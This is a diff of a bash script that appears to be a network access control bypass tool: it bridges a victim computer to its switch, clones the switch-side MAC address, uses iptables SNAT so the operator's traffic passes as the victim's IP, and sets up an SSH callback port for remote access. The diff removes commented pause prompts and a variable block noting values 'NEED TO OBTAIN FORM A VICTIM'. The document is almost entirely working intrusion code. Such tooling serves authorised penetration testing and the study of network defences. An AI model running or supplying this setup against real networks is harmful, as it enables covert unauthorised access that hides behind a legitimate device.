@@ -32,17 +32,6 @@ service network-manager stop
 echo "net.ipv6.conf.all.disable_ipv6 = 1" > /etc/sysctl.conf
 sysctl -p
 echo "" > /etc/resolv.conf
-# read -p "Ground work done, Press any key..." -n1 -s
-echo
-
-###### THIS BLOCK IS REDUDANT AS THESE VARIABLES ARE AUTOMAGICALLY OBTAINED######
-#SWMAC=		#MAC OF TO SWITCH eth1
-#NEED TO OBTAIN FORM A VICTIM
-#COMPMAC=
-#COMIP=
-#GWNET=
-#DEFGW=
-###### THIS BLOCK IS REDUDANT AS THESE VARIABLES ARE AUTOMAGICALLY OBTAINED######
 
 BRINT=br0 #bridge interface
 ININT=eth2 #interface of laptop to kill (we prefer to use two usb2eth's)
@@ -53,16 +42,6 @@ BRIP=169.254.66.66 #IP for the bridge
 DPORT=2222 #SSH CALL BACK PORT USE victimip:2222 to connect to attackerbox:22
 RANGE=61000-62000 #Ports for my traffic on NAT
 
-echo 
-#read -p "Loaded in Variables, Press any key..." -n1 -s
-echo 
-
-#ifconfig $ININT down #Disconnect inbuilt Ethernet Ports (Only use USB2ethernet)	
-
-echo 
-#read -p "Killed internal LAN, Press any key..." -n1 -s
-echo 
- 
 brctl addbr $BRINT #Make bridge
 brctl addif $BRINT $COMPINT #add computer side to bridge
 brctl addif $BRINT $SWINT #add switch side to bridge
@@ -82,8 +61,6 @@ macchanger -m $SWMAC $BRINT #Swap MAC of bridge to the switch side MAC
 
 echo "Bringing up the Bridge"				
 ifconfig $BRINT 0.0.0.0 up promisc #BRING UP BRIDGE
-
-#VICTIM MACHINE SHOULD WORK OK AT THIS POINT (if not badtimes - run!!)
 
 echo 
 read -p "Bridge up, should be dark, Connect Ethernet cables to adatapers and leave to steady (watch the lights make sure they don't go out!) Wait for 30seconds then press any key..." -n1 -s
@@ -134,20 +111,9 @@ iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p tcp -j SNAT --to $COMIP:$RA
 iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p udp -j SNAT --to $COMIP:$RANGE
 iptables -t nat -A POSTROUTING -o $BRINT -s $BRIP -p icmp -j SNAT --to $COMIP
 
-echo 
-#read -p "Start local SSH server" -n1 -s
-echo 
-
-#START SSH
-#/etc/init.d/ssh start
-
-echo 
-#read -p "All setup steps complete; check ports are still lit and operational" -n1 -s
-echo 
-
 echo "Re-enabling traffic flow; monitor ports for lockout"
 #Re-enable L2 and L3
 arptables -D OUTPUT -j DROP
 iptables -D OUTPUT -j DROP
 
-echo "Time for fun & profit"
+echo "You're all set! Happy Hunting!"
